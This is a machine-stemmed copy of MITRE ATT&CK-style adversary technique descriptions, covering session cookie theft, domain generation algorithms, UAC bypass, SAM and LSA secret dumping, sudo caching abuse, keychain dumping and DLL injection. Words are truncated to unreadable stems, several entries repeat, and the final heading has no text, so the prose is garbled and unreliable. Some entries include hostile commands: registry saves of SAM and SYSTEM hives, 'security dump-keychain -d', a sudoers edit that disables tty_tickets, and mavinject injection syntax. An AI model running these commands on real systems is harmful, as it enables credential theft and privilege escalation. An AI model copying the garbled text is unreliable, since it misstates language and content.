ste web sess cooky
advers ste web apply serv sess cooky us gain access web apply internet serv auth us without nee cred web apply serv oft us sess cooky auth tok us auth websit cooky oft valid extend period tim ev web apply act us cooky find disk process mem brows network traff remot system addit apply target machin might stor sensit auth cooky mem e.g ap auth cloud serv sess cooky us bypass multi-factor auth protocol pas cooky sev exampl malw target cooky web brows loc system kaspersky tajmah april 2019 unit 42 mac crypto cooky janu 2019 also op sourc framework evilginx 2 muraen gath sess cooky malicy proxy ex adversary-in-the-middle http set advers us phish campaign github evilginx2 github mauraen advers acquir valid cooky perform web sess cooky http techn login correspond web apply
contain orchest job
advers abus task schedule funct provid contain orchest tool kubernet schedule deploy contain config execut malicy cod contain orchest job run autom task spec dat tim simil cron job linux system deploy typ also config maintain quant contain tim autom process maintain persist within clust kubernet cronjob us schedule job run on contain perform spec task kubernet job kubernet cronjob advers theref util cronjob schedule deploy job execut malicy cod vary nod within clust threat matrix kubernet
domain gen algorithm
advers mak us domain gen algorithm dga dynam ident destin domain command control traff rath rely list stat ip address domain adv mak much hard defend block track tak command control channel pot could thousand domain malw check instruct cybereason dissect dga cisco umbrell dga unit 42 dga feb 2019 dga tak form app random “ gib ” string ex istgmxdejdnxuyla.ru construct domain nam gen let altern dga employ whol word unit cont word togeth instead let ex cityjulydish.net many dga time-based gen diff domain tim period hour dai month etc oth incorp see valu wel mak predict fut domain difficult defend cybereason dissect dga cisco umbrell dga talo ccleanup 2017 akama dga mitig advers us dga purpos fallback channel http contact los prim command control serv malw employ dga mean reest command control talo ccleanup 2017 fireey poshspy april 2017 eset sednit 2017 act
doubl fil extend
advers abus doubl extend filenam mean masquerad tru fil typ fil nam includ second fil typ extend caus first extend display ex < cod > file.txt.ex < /code > rend view < cod > file.txt < /code > howev second extend tru fil typ determin fil op execut real fil extend hid op system fil brows ex explorer.exe wel softw config us simil system ’ policy pcmag doubleextend socprim doubleextend advers abus doubl extend attempt cont dang fil typ payload common us involv trick us op think benign fil typ act execut cod fil oft pos email attach allow advers gain init access http us ’ system via spearph attach http us execut http exampl execut fil attach nam < cod > evil.txt.exe < /code > display < cod > evil.txt < /code > us us view benign text fil op inadvert execut hid malw socprim doubleextend common fil typ text fil .txt .doc etc im fil .jpg .gif etc typ us first extend appear benign execut extend common regard dang .exe .lnk .hta .scr oft appear second extend tru fil typ
bypass us account control
advers bypass uac mech elev process privileg system window us account control uac allow program elev privileg track integr level rang low high perform task administrator-level permit poss prompt us confirm impact us rang deny op high enforc allow us perform act loc admin group click prompt allow ent admin password complet act technet uac work uac protect level comput set anyth highest level certain window program elev privileg execut elev compon object model http object without prompt us uac not box technet insid uac msdn com elev exampl us rundll32 http load spec craft dll load auto-elevated compon object model http object perform fil op protect direct would typ requir elev access malicy softw also inject trust process gain elev privileg without prompt us davidson window many method discov bypass uac github readm pag uacm contain extend list method github uacm discov impl comprehend list bypass addit bypass method regul discov us wild < cod > eventvwr.exe < /code > auto-elevate execut spec bin script enigma0x3 fileless uac bypass fortinet fareit anoth bypass poss lat mov techn cred account admin privileg know sint uac singl system sec mech privileg integr process run on system unknown remot system default high integr san uac bypass
timestomp
advers tak act hid deploy new mod ex fil obfusc act timestomp techn mod timestamp fil mod access cre chang tim oft mim fil fold do exampl fil mod cre advers appear conspicu forens investig fil analys tool timestomp us along fil nam masquerad http hid malw tool windowsir anti-forensic techn
internet connect discovery
advers check internet connect comprom system perform autom discovery accompl num way us ping http < cod > tracert < /code > get request websit advers us result respons request determin system cap commun c2 serv attempt connect result also us ident rout redirect proxy serv
sudo sudo cach
advers perform sudo cach and/or us sudo fil elev privileg advers execut command us spawn process high privileg within linux maco system sudo sometim ref superus allow us perform command termin elev privileg control perform command system < cod > sudo < /code > command allow system admin deleg auth giv certain us group us abl run command root anoth us provid audit trail command argu sudo man pag 2018 sint sudo mak system admin us config feat < cod > timestamp_timeout < /code > amount tim minut inst < cod > sudo < /code > re-prompt password < cod > sudo < /code > abl cach cred period tim sudo cre touch fil < cod > /var/db/sudo < /code > timestamp sudo last run determin timeout addit < cod > tty_tickets < /code > vary tre new tty termin sess isol mean exampl sudo timeout on tty affect anoth tty typ password sudo fil < cod > /etc/sudoers < /code > describ us run command termin also describ command us run us group provid principl least privileg us run lowest poss permit tim elev us permit nee typ prompt password howev sudo fil also spec prompt us password lin lik < cod > user1 all= nopasswd < /code > osx.dok malw elev privileg requir edit fil though advers also abus poor config mech esc privileg without nee us password exampl < cod > /var/db/sudo < /code > timestamp monit see fal within < cod > timestamp_timeout < /code > rang malw execut sudo command without nee supply us password addit < cod > tty_tickets < /code > dis advers tty us wild malw dis < cod > tty_tickets < /code > pot mak script easy issu < cod > echo \'defaults tty_tickets\ ' > > /etc/sudoers < /code > cybereason osx proton ord chang reflect malw also issu < cod > killal termin < /code > maco sierr sudo fil < cod > tty_tickets < /code > en default
arch via custom method
advers compress encrypt dat collect pri exfilt us custom method advers choos us custom arch method encrypt xor stream ciph impl extern libr util ref custom impl well-known compress algorithm also us eset sednit part 2
mod cloud comput infrastruct
advers attempt mod cloud account comput serv infrastruct evad defens mod comput serv infrastruct includ cre delet mod on compon comput inst virt machin snapshot permit gain mod infrastruct compon bypass restrict prev access ex infrastruct mod infrastruct compon also allow advers evad detect remov evid pres mandy m-trends 2020
permit group discovery
advers attempt find group permit set inform help advers determin us account group avail memb us particul group us group elev permit
email collect
advers target us email collect sensit inform email contain sensit dat includ trad secret person inform prov valu advers advers collect forward email mail serv cli
sec account man
advers attempt extract cred mat sec account man sam databas eith in-memory techn window reg sam databas stor sam databas fil contain loc account host typ find < cod > net us < /code > command enum sam databas requir system level access numb tool us retriev sam fil in-memory techn pwdumpx.exe gsecdump http mimikatz http secretsdump.py altern sam extract reg reg < cod > reg sav hklm\sam sam < /code > < cod > reg sav hklm\system system < /code > creddump7 us process sam databas loc retriev hash github creddump7 not rid 500 account loc built-in admin rid 501 guest account us account start rid 1,000+
who
advers search publ who dat inform victim us target who dat stor reg internet reg rir respons alloc assign internet resourc domain nam anyon query who serv inform reg domain assign ip block contact inform dns nameserv who advers search who dat gath act inform threat act us onlin resourc command-line util pil who dat inform pot victim inform sourc rev opportun form reconnaiss ex act scan http phish inform http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http trust rel http
system firmw
advers mod system firmw persist systems.the bio bas input/output system un extens firmw interfac uef extens firmw interfac ef exampl system firmw op softw interfac op system hardw comput wikiped bio wikiped uef uef system firmw lik bio u ef und funct comput mod advers perform assist malicy act cap ex overwrit system firmw giv soph advers mean instal malicy firmw upd mean persist system difficult detect
search victim-owned websit
advers search websit own victim inform us target victim-owned websit contain vary detail includ nam departments/division phys loc dat key employ nam rol contact info ex email address http sit also detail highlight busy op rel comparitech leak advers search victim-owned websit gath act inform inform sourc rev opportun form reconnaiss ex phish inform http search op techn databas http est op resourc ex est account http comprom account http and/or init access ex trust rel http phish http
cloud group
advers attempt find cloud group permit set knowledg cloud permit group help advers determin particul rol us group within environ wel us assocy particul group auth access sev tool us find permit group < cod > get-msolrole < /code > powershel cmdlet us obtain rol permit group exchang off 365 account microsoft msolrol github raind az cli az cli googl cloud id provid ap also provid interfac obtain permit group command < cod > az ad us get-member-groups < /code > list group assocy us account az ap endpoint < cod > get http < /code > list group resourc avail us googl microsoft az cli black hil red team m ad az 2018 googl cloud id ap docu advers attempt list ac object determin own account access object exampl via aw < cod > getbucketac < /code > ap aw get bucket ac us inform advers target account permit giv object lev account already comprom access object
serv reg permit weak
advers execut malicy payload hijack reg entry us serv advers us flaw permit reg key rel serv redirect origin spec execut on control ord launch cod serv start window stor loc serv config inform reg < cod > hklm\system\currentcontrolset\services < /code > inform stor serv reg key manip mod serv execut paramet tool serv control sc.exe powershel http reg http access reg key control access control list us permit reg key sec malware_hides_servic permit us group prop set allow access reg key serv advers chang serv binpath/imagepa point diff execut control serv start restart adversary-controlled program execut allow advers est persist and/or privileg esc account context serv set execut local/domain account system localserv networkserv advers also alt reg key serv ’ reg tre exampl < cod > failurecommand < /code > key chang serv execut elev context anytim serv fail int corrupt kans serv rel collect tweet reg perm weak < cod > perform < /code > key contain nam driv serv perform dll nam sev export funct dll microsoft_services_registry_tree < cod > perform < /code > key already pres adversary-controlled us < cod > cre subkey < /code > permit advers cre < cod > perform < /code > key serv ’ reg tre point malicy dll insecure_reg_perms advers also ad < cod > paramet < /code > key stor driver-specific dat custom subkey malicy serv est persist en malicy act microsoft_services_registry_tree troj_zegost addit advers launch malicy serv us svchost.exe serv ’ fil ident us < cod > hkey_local_machine\system\currentcontrolset\services\servicename\parameters\servicedll < /code > malware_hides_servic
dns/passive dns
advers search dns dat inform victim us target dns inform includ vary detail includ reg nam serv wel record outlin address target ’ subdomain mail serv host advers search dns dat gath act inform threat act query nameserv target org direct search cent reposit log dns query respons know pass dns dns dumpst circ pass dns advers also seek target dns misconfigurations/leak rev inform intern network inform sourc rev opportun form reconnaiss ex search victim-owned websit http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http trust rel http
apply exhaust flood
advers target resourc intend feat apply caus den serv do deny avail apply exampl spec feat web apply high resourc intend rep request feat abl exhaust system resourc deny access apply serv arb annualdosreport jan 2018
rc.common
boot process maco execut < cod > sourc /etc/rc.common < /code > shel script contain vary util funct fil also defin routin process command-line argu gath system set thu recommend includ start startup item script startup item maco o x deprec techn fav launch ag launch daemon cur stil us advers us rc.common fil way hid cod persist execut reboot root us method mac malw persist
comprom softw depend develop tool
advers manip softw depend develop tool pri receipt fin consum purpos dat system comprom apply oft depend extern softw funct prop popul op sourc project us depend many apply target mean ad malicy cod us depend trendmicro npm comprom target spec desir victim set distribut broad set consum mov addit tact spec victim
digit cert
advers buy and/or ste ssl/tls cert us target ssl/tls cert design instil trust includ inform key inform own id digit sign ent ver cert cont correct sign valid person examin cert trust sign know us key commun own advers purchas ste ssl/tls cert op encrypt c2 traff ex asymmet cryptograph http web protocol http ev en adversary-in-the-middle http cert trust otherw ad root trust i.e instal root cert http purchas digit cert do us front org us inform ste prevy comprom ent allow advers valid cert provid ent advers also ste cert mat direct comprom third-party includ cert auth diginotarcomprom advers reg hijack domain lat purchas ssl/tls cert cert auth ex allow advers acquir ssl/tls cert domain valid cert fre let encrypt faq obtain digit cert advers instal cert see instal digit cert http infrastruct control
dns serv
advers set domain nam system dns serv us target post-compromise act advers util dns traff vary task includ command control ex apply lay protocol http instead hijack ex dns serv advers opt config run dns serv support op run dns serv advers control admin server-side dns c2 traff dns http control dns serv advers config dns apply provid condit respons malw gen flex structure dns-based c2 channel unit42 dns mar 2019
disk wip
advers wip corrupt raw disk dat spec system larg numb network interrupt avail system network resourc direct writ access disk advers attempt overwrit port disk dat advers opt wip arbit port disk dat and/or wip disk structure lik mast boot record mbr complet wip disk sect attempt maxim impact target org op network-wide avail interrupt goal malw us wip disk worm-like feat prop across network lev addit techn lik valid account http o cred dump http smb/windows admin shar http novett blockbust destruct malw
dns
advers commun us domain nam system dns apply lay protocol avoid detection/network filt blend ex traff command remot system oft result command emb within protocol traff cli serv dns protocol serf admin funct comput network thu common environ dns traff also allow ev network auth complet dns packet contain many field head dat cont oft know dns tunnel advers abus dns commun system control within victim network also mim norm expect traff pan dns tunnel med dnstunneling
cloud inst metadat ap
advers attempt access cloud inst metadat ap collect cred sensit dat cloud serv provid support cloud inst metadat ap serv provid run virt inst allow apply access inform run virt inst avail inform gen includ nam sec group addit metadat includ sensit dat cred userdat script contain addit secret inst metadat ap provid conveny assist man apply access anyon access inst aw inst metadat ap cloud metadat ap us least on high profil comprom kreb capit on august 2019 advers pres run virt inst query inst metadat ap direct ident cred grant access addit resourc addit advers exploit server-side request forgery ssrf vuln publ fac web proxy allow gain access sensit inform via request inst metadat ap redlock inst metadat ap 2018 de facto standard across cloud serv provid host inst metadat ap < cod > http < /code >
securityd mem
advers obtain root access allow read securityd ’ mem scan mem find correct sequ key rel try decrypt us ’ logon keychain provid advers plaintext password us wif mail brows cert sec not etc o x keychain osx keydnap malw o x pri el capit us root access read plaintext keychain password logged-in us appl ’ keychain impl allow cred cach us rep prompt password o x keychain extern da o x way appl ’ securityd util tak us ’ logon password encrypt pbkdf2 stor mast key mem appl also us set key algorithm encrypt us ’ password mast key find advers nee it valu unlock fin password o x keychain
group policy discovery
advers gath inform group policy set ident path privileg esc sec meas apply within domain discov pattern domain object manip us blend environ group policy allow cent man us comput set act direct ad group policy object gpo contain group policy set mak fil stor within pred network path < cod > \ < domain > \sysvol\ < domain > \policies\ < /code > technet group policy bas adsec gpo persist 2016 advers us command < cod > gpresult < /code > vary publ avail powershel funct < cod > get-domaingpo < /code > < cod > get-domaingpolocalgroup < /code > gath inform group policy set microsoft gpresult github powershel empir advers us inform shap follow-on behavy includ determin pot attack path within target network wel opportun manip group policy set i.e domain policy mod http benefit
bootkit
advers us bootkit persist system bootkit resid lay op system mak difficult perform ful remedy unless org suspect on us act accord bootkit malw vary mod boot sect hard driv includ mast boot record mbr volum boot record vbr mandy trend 2016 mbr sect disk first load complet hardw init bio loc boot load advers raw access boot driv overwrit are divert execut startup norm boot load advers cod lau 2011 mbr pass control boot process vbr simil cas mbr advers raw access boot driv overwrit vbr divert execut startup advers cod
dat remov med
advers search connect remov med comput comprom find fil interest sensit dat collect remov med opt disk driv usb mem etc connect comprom system pri exfilt interact command shel us common funct within cmd http us gath inform advers also us autom collect http remov med
cod sign
cod sign provid level auth bin develop guar bin tamp wikiped cod sign howev advers know us cod sign cert masquerad malw tool legitim bin janicab cert us op cre forg ste advers securel digit cert symantec digit cert cod sign ver softw first run us modern window macos/o x system us linux due dec nat platform wikiped cod sign cod sign cert us bypass sec policy requir sign cod execut system
mavinject
advers abus mavinject.exe proxy execut malicy cod mavinject.exe microsoft apply virt inject window util inject cod extern process part microsoft apply virt app-v lolba mavinject advers abus mavinject.exe inject malicy dlls run process i.e dynamic-link libr inject http allow arbit cod execut ex < cod > c \windows\system32\mavinject.exe pid /injectrunning path_dll < /code > lazar ttp evolv reaqt mavinject sint mavinject.exe digit sign microsoft proxy execut via method evad detect sec produc execut mask legitim process addit dynamic-link libr inject http mavinject.exe also abus perform import describ inject via < cod > /hmodule < /code > command-line paramet ex < cod > mavinject.exe pid /hmodule=base_address path_dll ordinal_number < /code > command would inject import tabl entry consist spec dll mod giv bas address mavinject funct deconstruct
cloud inst metadat ap
advers attempt access cloud inst metadat ap collect cred sensit dat cloud serv provid support cloud inst metadat ap serv provid run virt inst allow apply access inform run virt inst avail inform gen includ nam sec group addit metadat includ sensit dat cred userdat script contain addit secret inst metadat ap provid conveny assist man apply access anyon access inst aw inst metadat ap advers pres run virt inst query inst metadat ap direct ident cred grant access addit resourc addit attack exploit server-side request forgery ssrf vuln publ fac web proxy allow attack gain access sensit inform via request inst metadat ap redlock inst metadat ap 2018 de facto standard across cloud serv provid host inst metadat ap < cod > http < /code >
process hollow
process hollow occ process cre suspend stat mem unmap replac malicy cod simil process inject http execut malicy cod mask legitim process evad defens detect analys leitch hollow elast process inject july 2017
loc dat stag
advers stag collect dat cent loc direct loc system pri exfilt dat keep sep fil combin on fil techn arch collect dat http interact command shel us common funct within cmd http bash us cop dat stag loc advers also stag collect dat vary avail formats/location system includ loc stor databases/repository window reg prevail darkwatchm 2021
match legitim nam loc
advers match approxim nam loc legitim fil resourc naming/plac do sak evad defens observ do plac execut common trust direct ex system32 giv nam legitim trust program ex svchost.exe contain environ also do cre resourc namespac match nam conv contain pod clust altern fil contain im nam giv clos approxim legitim programs/image someth innocu advers also us icon fil try mim
domain front
domain front tak adv rout scheme cont delivery network cdns serv host multipl domain obfusc intend destin http traff traff tunnel http fifield block resist commun domain front 2015 techn involv us diff domain nam sni field tl head host field http head domain serv cdn cdn rout address spec http head unwrap tl head vary techn domainless front util sni field leav blank allow front work ev cdn attempt valid sni http host field match blank sni field ign exampl domain-x domain-y custom cdn poss plac domain-x tl head domain-y http head traff appear go domain-x howev cdn rout domain-y
digit cert
advers cre self-signed ssl/tls cert us target ssl/tls cert design instil trust includ inform key inform own id digit sign ent ver cert cont correct sign valid person examin cert trust sign know us key commun own cas self-signing digit cert lack el trust assocy sign third-party cert auth ca advers cre self-signed ssl/tls cert us op encrypt c2 traff ex asymmet cryptograph http web protocol http ev en adversary-in-the-middle http ad root trust i.e instal root cert http cre digit cert advers instal cert see instal digit cert http infrastruct control
stor dat manip
advers insert delet manip dat rest ord influ extern outcom hid act thu threaten integr dat fireey apt38 oct 2018 doj lazar sony 2018 manip stor dat advers attempt affect busy process org understand decid mak stor dat could includ vary fil form off fil databas stor email custom fil form typ mod impact depend typ dat wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
password crack
advers us password crack attempt recov us cred plaintext password cred mat password hash obtain o cred dump http us obtain password hash get advers far pas hash http opt advers lev dat config reposit http ord obtain hash cred network dev us-cert-ta18-106a techn system guess password us comput hash avail advers us pre-computed rainbow tabl crack hash crack hash us do adversary-controlled system outsid target network wikiped password crack result plaintext password result success crack hash us log system resourc serv account access
sid-history inject
window sec ident sid un valu ident us group account sid us window sec sec describ access tok microsoft sid account hold addit sid sid-history act direct attribut microsoft sid-history attribut allow inter-operable account migr domain valu sid-history includ access tok advers us mech privileg esc domain admin equ right harvest well-known sid valu microsoft wel know sid jun 2017 insert sid-history en imperson arbit users/group enterpr admin manip result elev access loc resourc and/or access otherw inaccess domain via lat mov techn remot serv http window admin shar http window remot man http
loc email collect
advers target us email loc system collect sensit inform fil contain email dat acquir us ’ loc system outlook stor cach fil outlook stor dat loc offlin dat fil extend .ost outlook 2010 lat support .ost fil siz 50gb ear vert outlook support 20gb outlook fil siz imap account outlook 2013 ear pop account us outlook dat fil .pst oppos .ost wherea imap account outlook 2016 lat us .ost fil typ outlook dat fil typ stor ` c \users\ < usernam > \documents\outlook fil ` ` c \users\ < usernam > \appdata\local\microsoft\outlook ` microsoft outlook fil
keychain
advers acquir cred keychain keychain keychain serv maco cred man system stor account nam password priv key cert sensit apply dat pay dat sec not three typ keychain login keychain system keychain loc item icloud keychain default keychain login keychain stor us password inform system keychain stor item access op system item shar among us host loc item icloud keychain us item synt appl ’ icloud serv keychain view edit keychain access apply us command-line util < cod > sec < /code > keychain fil loc < cod > ~/library/keychains/ < /code > < cod > /library/keychains/ < /code > < cod > /network/library/keychains/ < /code > keychain serv appl keychain decrypt passw osx keychain schaumann advers gath us cred keychain storage/memory exampl command < cod > sec dump-keychain –d < /code > dump login keychain cred < cod > ~/library/keychains/login.keychain-db < /code > advers also direct read login keychain cred < cod > ~/library/keychains/login.keychain < /code > fil method requir password default password login keychain cur us ’ password login maco host extern da o x way empir keychain decrypt
boot logon autostart execut
advers config system set autom execut program system boot logon maintain persist gain higher-level privileg comprom system op system mech autom run program system boot account logon microsoft run key msdn auth pack microsoft timeprovid cyl reg persist sept 2013 linux kernel program mech includ autom execut program plac spec design direct ref reposit stor config inform window reg advers achiev goal mod extend feat kernel sint boot logon autostart program run high privileg advers lev elev privileg
lsa secret
advers system access host attempt access loc sec auth lsa secret contain vary diff cred mat cred serv account passcap lsa secret microsoft ad admin tier model tilbury window cred lsa secret stor reg < cod > hkey_local_machine\security\policy\secrets < /code > lsa secret also dump mem ir dump lsa secret reg http us extract reg mimikatz http us extract secret mem ir dump lsa secret
port monit
port monit set addmonit ap cal set dll load startup addmonit dll loc < cod > c \windows\system32 < /code > load print spool serv spoolsv.exe boot spoolsv.exe process also run system level permit bloxham altern arbit dll load permit allow writ fully-qualified pathnam dll < cod > hklm\system\currentcontrolset\control\print\monitors < /code > reg key contain entry follow loc port standard tcp/ip port usb monit wsd port advers us techn load malicy cod startup persist system reboot execut system
weak encrypt
advers comprom network dev ’ encrypt cap ord bypass encrypt would otherw protect dat commun cisco syn knock evolv encrypt us protect transmit network traff maintain confid protect unauth disclos integr protect unauth chang encrypt ciph us convert plaintext mess ciphertext comput intend deciph without assocy decrypt key typ long key increas cost cryptanalys decrypt without key advers comprom manip dev perform encrypt network traff exampl behavy mod system im http reduc key spac http dis crypto hardw http advers neg effect and/or elimin dev ’ abl sec encrypt network traff pos gre risk unauth disclos help facilit dat manip cred access collect effort cisco blog leg dev attack
saml tok
advers forg saml tok permit claim lifetim poss valid saml token-signing cert microsoft solarwind step default lifetim saml tok on hour valid period spec < cod > notonoraft < /code > valu < cod > condit ... < /code > el tok valu chang us < cod > accesstokenlifetim < /code > < cod > lifetimetokenpolicy < /code > microsoft saml tok lifetim forg saml tok en advers auth across serv us saml 2.0 sso singl sign-on mech cyberark gold saml advers util priv key http comprom org token-signing cert cre forg saml tok advers sufficy permit est new fed trust act direct fed serv ad f serv instead gen trust token-signing cert microsoft solarwind custom guid diff ste apply access tok http simil behavy tok new forg advers rath ste interceiv legitim us advers gain admin az ad privileg saml tok forg claim repres high privileg account lead us altern auth mat http bypass multi-factor auth protect mech microsoft solarwind custom guid
spearph link
spearph link spec vary spearph diff form spearph employ us link download malw contain email instead attach malicy fil email avoid defens inspect email attach form spearph electron del soc engin target spec individ company industry cas malicy email contain link gen link accompany soc engin text requir us act click cop past url brows lev us execut http visit websit comprom web brows us exploit us prompt download apply docu zip fil ev execut depend pretext email first plac advers also includ link intend interact direct email read includ emb im intend exploit end system direct ver receipt email i.e web bugs/web beacon link also direct us malicy apply design ste apply access tok http lik oau tok ord gain access protect apply inform trend micro pawn storm oau 2017
serv stop
advers stop dis serv system rend serv unavail legitim us stop crit serv process inhibit stop respons incid aid advers overal object caus dam environ talo olymp destroy 2018 novett blockbust advers accompl dis individ serv high import org < cod > msexchang < /code > mak exchang cont inaccess novett blockbust cas advers stop dis many serv rend system unus talo olymp destroy 2018 serv process allow mod dat stor run advers stop serv process ord conduc dat destruct http dat encrypt impact http dat stor serv lik exchang sql serv securework wannacry analys
malw
advers develop malw malw compon us target build malicy softw includ develop payload drop post-compromise tool backdo includ backdo im pack c2 protocol cre infect remov med advers develop malw support op cre mean maintain control remot machin evad defens execut post-compromise behavy mandy apt1 kaspersky sof activemalwareenergy fbi flash fin7 usb legitim develop effort diff skil set requir develop malw skil nee loc in-house nee contract us contract consid extend advers malw develop cap provid advers play rol shap requir maintain degr exclud malw aspect malw develop c2 protocol develop requir advers obtain addit infrastruct exampl malw develop commun twit c2 requir us web serv http fireey apt29
regsvcs/regasm
regsvc regasm window command-line util us reg .net compon object model com assembl digit sign microsoft msdn regsvc msdn regasm advers us regsvc regasm proxy execut cod trust window util util us bypass process whitel us attribut within bin spec cod run reg unreg < cod > comregisterfunct < /code > < cod > comunregisterfunct < /code > respect cod reg unreg attribut execut ev process run insufficy privileg fail execut lolba regsvc lolba regasm
sudo cach
< cod > sudo < /code > command allow system admin deleg auth giv certain us group us abl run command root anoth us provid audit trail command argu sudo man pag 2018 sint sudo mak system admin us config feat < cod > timestamp_timeout < /code > amount tim minut inst < cod > sudo < /code > re-prompt password < cod > sudo < /code > abl cach cred period tim sudo cre touch fil < cod > /var/db/sudo < /code > timestamp sudo last run determin timeout addit < cod > tty_tickets < /code > vary tre new tty termin sess isol mean exampl sudo timeout on tty affect anoth tty typ password advers abus poor config esc privileg without nee us password < cod > /var/db/sudo < /code > timestamp monit see fal within < cod > timestamp_timeout < /code > rang malw execut sudo command without nee supply us password < cod > tty_tickets < /code > dis advers tty us osx proton malw dis < cod > tty_tickets < /code > pot mak script easy issu < cod > echo \'defaults tty_tickets\ ' > > /etc/sudoers < /code > cybereason osx proton ord chang reflect proton malw also must issu < cod > killal termin < /code > maco sierr sudo fil < cod > tty_tickets < /code > en default
domain account
advers attempt get list domain account inform help advers determin domain account ex aid follow-on behavy command < cod > net us /domain < /code > < cod > net group /domain < /code > net http util < cod > dscacheutil -q group < /code > maco < cod > ldapsearch < /code > linux list domain us group
act setup
advers achiev persist ad reg key act setup loc machin act setup window mech us execut program us log valu stor reg key execut us log comput klein act setup 2010 program execut context us account assocy permit level advers abus act setup cre key < cod > hklm\software\microsoft\active setup\installed components\ < /code > set malicy valu < cod > stubpa < /code > valu serv program execut us log comput mandy gly apt 2010 citizenlab packr 2015 fireey cfr wat hol 2012 securel bright star 2015 paloalto trop troop 2016 advers abus compon execut malw remot access tool maintain persist system reboot advers also us masquerad http mak reg entry look assocy legitim program
hid artifact
advers attempt hid artifact assocy behavy evad detect op system feat hid vary artifact import system fil admin task execut avoid disrupt us work environ prev us chang fil feat system advers abus feat hid artifact fil direct us account system act evad detect sof komplex trod cybereason osx pirrit malwarebyt ad july 2015 advers also attempt hid artifact assocy malicy behavy cre comput reg isol common sec instru us virt technolog sopho ragn 2020
dynam dat exchang
advers us window dynam dat exchang dde execut arbit command dde client-server protocol one-tim and/or continu inter-process commun ipc apply link est apply autonom exchang transact consist string warm dat link not dat item chang hot dat link duply chang dat item request command execut object link emb ol abl link dat docu origin impl dde despit supers compon object model http dde en window 10 microsoft off 2016 via reg key bleepingcomput dde dis word dec 2017 microsoft adv170021 dec 2017 microsoft dde adv nov 2017 microsoft off docu poison dde command direct emb fil us del execut via phish http campaign host web cont avoid us vis bas apply vba macro sensepost p dde 2016 kettl csv dde aug 2014 enigm rev dde jan 2018 sensepost macroless dde oct 2017 simil advers infect payload execut apply and/or command victim dev way emb dde formul within csv fil intend op window spreadsheet program owasp csv inject csv excel macro inject dde could also lev advers op comprom machin direct access command script interpret http dde execut invok remot via remot serv http distribut compon object model http dcom fireey hunt com jun 2019
malicy fil
advers rely upon us op malicy fil ord gain execut us subject soc engin get op fil lead cod execut us act typ observ follow-on behavy spearph attach http advers us sev typ fil requir us execut includ .doc .pdf .xls .rtf .scr .exe .lnk .pif .cpl advers employ vary form masquerad http obfusc fil inform http increas lik us op success execut malicy fil method includ us famili nam conv and/or password protect fil supply instruct us op password protect word doc malicy fil http frequ occ short init access occ phas intrud advers plac fil shar direct us desktop hop us click act also see short intern spearph http
ident busy tempo
advers gath inform victim busy tempo us target inform org ’ busy tempo includ vary detail includ op hours/day week inform also rev times/date purchas ship victim ’ hardw softw resourc advers gath inform vary way direct elicit via phish inform http inform busy tempo also expos advers via onlin access dat set ex soc med http search victim-owned websit http threatpost broadvo leak gath inform rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex est account http comprom account http and/or init access ex supply chain comprom http trust rel http
sec softw discovery
advers attempt get list sec softw config defend tool sens inst system includ thing loc firewal rul anti-virus advers us inform sec softw discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act window exampl command us obtain sec softw inform netsh http < cod > reg query < /code > reg http < cod > dir < /code > cmd http taskl http ind discovery behavy spec typ softw sec system advers look mac becom common see maco malw perform check littlesnitch knockknock softw
hardw
advers gath inform victim host hardw us target inform hardw infrastruct includ vary detail typ vert spec host wel pres addit compon might ind ad defend protect ex card/biometric read ded encrypt hardw etc. advers gath inform vary way direct collect act via act scan http ex hostnam serv ban us ag string phish inform http advers also comprom sit includ malicy cont design collect host inform visit scanbox inform hardw infrastruct also expos advers via onlin access dat set ex job post network map assess report resum purchas invo gath inform rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex comprom hardw supply chain http hardw addit http
taint shar cont
advers del payload remot system ad cont shar stor loc network driv intern cod reposit cont stor network driv shar loc taint ad malicy program script exploit cod otherw valid fil us op shar taint cont malicy port execut run advers cod remot system advers us taint shar cont mov lat direct shar pivot vary techn us sev techn prop malw us access shar network direct us shortcut mod http direct .lnk fil us masquerad http look lik real direct hid hid fil direct http malicy .lnk-based direct emb command execut hid malw fil direct op real intend direct us expect act stil occ us frequ us network direct techn result frequ reinfect broad access system pot new high privileg account retwin direct shar pivot advers also comprom shar network direct bin infect append prepend cod healthy bin shar network direct malw mod origin entry point oep healthy bin ens execut legitim cod infect could continu spread via new infect fil execut remot system infect target bin non-binary form end extend includ limit .exe .dll .scr .bat and/or .vbs
domain trust mod
advers ad new domain trust mod property ex domain trust evad defens and/or elev privileg domain trust detail wheth domain fed allow auth auth property apply domain purpos access shar resourc microsoft - az ad fed trust object includ account cred auth mat apply serv tok domain manip domain trust allow advers esc privileg and/or evad defens mod set ad object control exampl us forg saml tok http without nee comprom sign cert forg new cred instead advers manip domain trust ad sign cert advers also convert domain fed domain en malicy trust mod alt claim issu rul log valid set cred spec us aadintern zur ad fed domain
symmet cryptograph
advers employ know symmet encrypt algorithm cont command control traff rath rely inh protect provid commun protocol symmet encrypt algorithm us key plaintext encrypt ciphertext decrypt common symmet encrypt algorithm includ ae de 3des blowf rc4
loc account
advers attempt get list loc system account inform help advers determin loc account ex system aid follow-on behavy command < cod > net us < /code > < cod > net localgroup < /code > net http util < cod > id < /code > < cod > group < /code > maco linux list loc us group linux loc us also enum us < cod > /etc/passwd < /code > fil maco < cod > dscl list /users < /code > command us enum loc account
securityd mem
o x pri el capit us root access read plaintext keychain password logged-in us appl ’ keychain impl allow cred cach us rep prompt password o x keychain extern da o x way appl ’ securityd util tak us ’ logon password encrypt pbkdf2 stor mast key mem appl also us set key algorithm encrypt us ’ password mast key find attack nee it valu unlock fin password o x keychain advers obtain root access allow read securityd ’ mem scan mem find correct sequ key rel try decrypt us ’ logon keychain provid advers plaintext password us wif mail brows cert sec not etc o x keychain osx keydnap malw
soc med account
